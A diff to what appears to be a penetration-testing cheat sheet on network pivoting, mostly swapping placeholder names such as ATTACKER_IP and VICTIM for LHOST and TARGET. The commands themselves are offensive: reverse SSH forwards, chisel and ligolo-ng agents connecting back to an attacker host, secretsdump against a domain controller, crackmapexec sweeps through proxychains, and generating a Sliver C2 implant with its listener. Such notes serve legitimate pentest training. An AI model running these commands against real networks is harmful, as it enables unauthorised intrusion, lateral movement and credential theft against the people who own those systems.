@@ -6,7 +6,7 @@
 
 ```bash
 # Local port forward (access internal service via SSH)
-ssh -L LOCAL_PORT:TARGET_IP:TARGET_PORT user@PIVOT_HOST
+ssh -L LOCAL_PORT:RHOST:RPORT user@PIVOT_HOST
 ssh -L 3389:INTERNAL_WIN:3389 user@PIVOT_SSH -N
 # Connect via: xfreerdp /v:127.0.0.1 /u:USER /p:PASS
 
@@ -17,7 +17,7 @@ proxychains nmap -sT -p 445,389,88 10.10.10.0/24
 proxychains impacket-secretsdump $DOMAIN/$USER:$PASS@INTERNAL_DC
 
 # Remote port forward (expose internal to attacker)
-ssh -R REMOTE_PORT:INTERNAL_HOST:INTERNAL_PORT user@ATTACKER_IP -N
+ssh -R REMOTE_PORT:INTERNAL_HOST:INTERNAL_PORT user@LHOST -N
 
 # SSH through jump host
 ssh -J user@JUMP_HOST user@INTERNAL_HOST
@@ -33,20 +33,20 @@ gunzip chisel_linux_amd64.gz && chmod +x chisel_linux_amd64
 # Attacker — start server
 ./chisel_linux_amd64 server --port 8080 --reverse
 
-# Victim — connect back (reverse SOCKS)
-.\chisel.exe client ATTACKER_IP:8080 R:socks
-# or: ./chisel client ATTACKER_IP:8080 R:socks
+# TARGET — connect back (reverse SOCKS)
+.\chisel.exe client LHOST:8080 R:socks
+# or: ./chisel client LHOST:8080 R:socks
 
 # Now proxychains through port 1080 (default chisel SOCKS)
 proxychains crackmapexec smb 10.10.10.0/24 -u $USER -p $PASS
 
 # Forward specific port
-.\chisel.exe client ATTACKER_IP:8080 R:3389:INTERNAL_WIN:3389
+.\chisel.exe client LHOST:8080 R:3389:INTERNAL_WIN:3389
 # Connect: xfreerdp /v:127.0.0.1:3389 ...
 
-# Victim is server (firewall allows inbound on victim)
+# TARGET is server (firewall allows inbound on TARGET)
 ./chisel server --port 8080
-./chisel client VICTIM:8080 5985:INTERNAL_WIN:5985   # Forward WinRM
+./chisel client TARGET:8080 5985:INTERNAL_WIN:5985   # Forward WinRM
 ```
 
 ## 10.3 Ligolo-ng
@@ -59,14 +59,14 @@ sudo ip tuntap add user $USER mode tun ligolo
 sudo ip link set ligolo up
 ./proxy -selfcert -laddr 0.0.0.0:11601
 
-# Victim — connect back
-.\agent.exe -connect ATTACKER_IP:11601 -ignore-cert
+# TARGET — connect back
+.\agent.exe -connect LHOST:11601 -ignore-cert
 ```
 
 ```text
 # In ligolo proxy console:
 >> session      # Select session
->> ifconfig     # Show victim's interfaces
+>> ifconfig     # Show TARGET's interfaces
 >> start        # Start tunneling
 ```
 
@@ -82,17 +82,17 @@ nmap -sT -p 88,389,445 10.10.10.100
 ```text
 # Port forward (for reverse shells from internal)
 >> listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444
-# Shells sent to VICTIM_IP:1234 will arrive at ATTACKER:4444
+# Shells sent to TARGET_IP:1234 will arrive at ATTACKER:4444
 ```
 
 ## 10.4 Sliver C2
 
 ```bash
 # Generate a Windows Implant 
-generate --mtls KALI_IP:443 --os windows --save /tmp/pivot.exe
+generate --mtls LHOST:443 --os windows --save /tmp/pivot.exe
 
 # Upload to target machine 
-mtls -L KALI_IP -l 443
+mtls -L LHOST -l 443
 jobs 
 
 # Then run from Target
@@ -110,7 +110,7 @@ socks5 start
 
 # Another terminal
 proxychains -q nmap 
-sudo proxychains -q nmap -sT -p80 -pn TARGET_IP
+sudo proxychains -q nmap -sT -p80 -pn RHOST
 ```
 
 ## 10.5 Other Pivoting Tools
